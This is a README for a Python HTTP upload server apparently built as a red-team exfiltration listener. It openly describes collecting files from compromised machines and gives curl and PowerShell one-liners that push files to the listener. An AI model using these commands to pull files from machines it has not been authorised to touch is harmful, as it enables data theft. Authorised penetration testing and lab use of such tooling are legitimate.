# SimpleExfil

SimpleExfil lets you exfiltrate your files. This server accepts and stores files sent through HTTP POST requests, ideal for operations requiring file uploads from compromised machines or remote systems. It's lightweight, easy to deploy, and listens on a customizable port.

## Requirements

- Python 3.x

## Usage

Start the server by specifying the desired port as an argument. If no port is specified, it defaults to 8000. You can optionally specify the directory where uploaded files will be stored. If omitted, the server uses the current directory or the path provided in the `UPLOAD_DIR` environment variable.

```
python simpleexfil.py [PORT] [UPLOAD_DIR]
```

Alternatively, set the `UPLOAD_DIR` environment variable to control the
destination folder without passing it as an argument.

To upload a file, use `curl` from the command line, PowerShell, or any suitable HTTP client. Example for uploading `example.txt`:

```
curl -F "file=@example.txt" http://127.0.0.1:8000
```
Note that this only works with actual `curl`, so this command might not work in PowerShell.

To upload a file using PowerShell you can use the following (may not be very reliable):
```
(New-Object System.Net.WebClient).UploadFile("http://127.0.0.1:8000", "C:\tmp\example.txt")
```

Server can also be accessed on the browser for a classic upload UI.

### Enhanced Web UI

This tool includes a drag-and-drop interface. After starting the
server, open your browser and navigate to `http://127.0.0.1:8000/` to access the
new UI. Drop a file onto the highlighted area or click to choose a file and it
will be uploaded automatically.

## File Storage Behavior

The server uses the base name of the uploaded file when saving to avoid
directory traversal attacks. If a file with the requested name already
exists, a numerical suffix is appended (e.g. `file.txt`, `file_1.txt`,
`file_2.txt`, ...).
